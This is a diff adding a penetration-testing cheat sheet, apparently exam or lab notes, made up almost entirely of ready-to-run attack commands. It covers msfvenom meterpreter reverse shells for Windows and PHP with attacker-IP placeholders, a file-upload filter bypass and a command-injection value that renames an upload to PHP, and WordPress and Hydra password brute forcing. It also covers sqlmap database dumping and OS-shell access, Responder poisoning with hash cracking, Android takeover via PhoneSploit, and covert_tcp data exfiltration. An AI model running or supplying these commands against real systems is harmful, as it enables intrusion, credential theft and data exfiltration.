@@ -1,0 +1,157 @@
+Initial scanning phase
+-------------------------------------------
+>> netdiscover -r 192.168.0.0/24
+
+
+
+
+for Android detection in nmap add
+-----------------------------------------------
+>> --max-rate 100 (with nmap)
+
+===========================================
+
+for windows reverse shell 
+-----------------------------------------------------------------------------
+>> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<PORT> -f exe > filename.exe
+>> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<PORT> -a x86 -f exe > filename.exe
+ 
+In msfconsole
+
+>> use exploit/multi/handler
+>> set PAYLOAD windows/x64/meterpreter/reverse_tcp  OR set PAYLOAD windows/meterpreter/reverse_tcp
+>> set LHOST
+>> set LPORT
+>> exploit
+
+==============================================================================
+
+WPSCAN
+----------------------------------------------------------
+Username enum of wordpress website
+
+>> wpscan --url http://example.com/wordpress --enumerate u 
+
+Wordpress Site Login BruteForce
+
+>> wpscan --url http://example.com/wordpress  -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+==========================================================================
+
+File Upload Vulnerability
+------------------------------------------------------------
+>> pentest monkey reverse php shell or
+>>msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<free PORT> -f raw
+add GIF98 and change extentension to .jpeg
+then
+>> nc -nvlp <PORT> or in msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost <attackerip>
+set lport <freeport>
+run
+
+in command injection
+>>8.8.8.8|copy file.jpeg file.php
+
+==================================================================
+
+SQL Map
+-----------------------------------------------------------
+#List databases, add cookie values
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”document.cookie” --dbs 
+  OR
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”document.cookie”   --data="id=1&Submit=Submit" --dbs  
+
+
+# List Tables, add databse name
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”document.cookie” -D database_name --tables  
+  
+# List Columns of that table
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”document.cookie” -D database_name -T target_Table --columns
+  
+#Dump all values of the table
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”document.cookie” -D database_name -T target_Table --dump
+  
+#shell access
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”document.cookie” --os-shell
+
+====================================================================
+
+Brute force using hydra
+-------------------------------------------------------------
+SSH
+>> hydra -L username.txt -P passlist.txt 192.168.0.100 ssh
+-L = list of username
+-l = single username
+-P = list of password
+-p = single password
+
+FTP
+>> hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+-s = port number
+
+telnet
+>> hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet 
+-o = output
+
+==================================================================
+
+LLMNR/NBT - Poisoning
+------------------------------------
+>> responder -I eth0
+locate to  usr/share/responder/logs/SMB<filename>
+>> john SMB<filename>
+
+===============================================================
+
+SNOW.exe
+------------------------------
+# To hide the text
+>>SNOW.EXE -C -p 1234 -m "Secret Message"  original.txt ciper.txt
+ 
+# To unhide the hidden text
+>>SNOW.EXE -C -p 1234  ciper.txt
+
+-p Password
+-m "the secret msg"
+
+==============================================================
+
+SMB Enum
+--------------------
+msfconsole
+>>search auxiliary smb scanner version
+>>set options
+>>run
+
+=============================================================
+
+SNMP Enum
+-----------------
+>>nmap -sU -p 161 --script=snmp-brute 10.10.1.2
+
+==============================================================
+
+Android hacking 
+--------------------
+>> sudo apt-get install adb -y
+>> git clone https://github.com/aerosol-can/PhoneSploit
+>> pip3 install colorama/python3 -m pip install colorama
+
+>> cd PhoneSploit
+>> python3 phonesloit.py
+
+============================================================
+
+COVERT TCP
+----------------
+# Compile the Code  
+cc -o covert_tcp covert_tcp.c
+  
+# Reciever Machine(192.168.29.53)  
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
+ 
+# Sender Machine(192.168.29.123) 
+# Create A Message file that need to be transferred Eg:secret.txt
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt
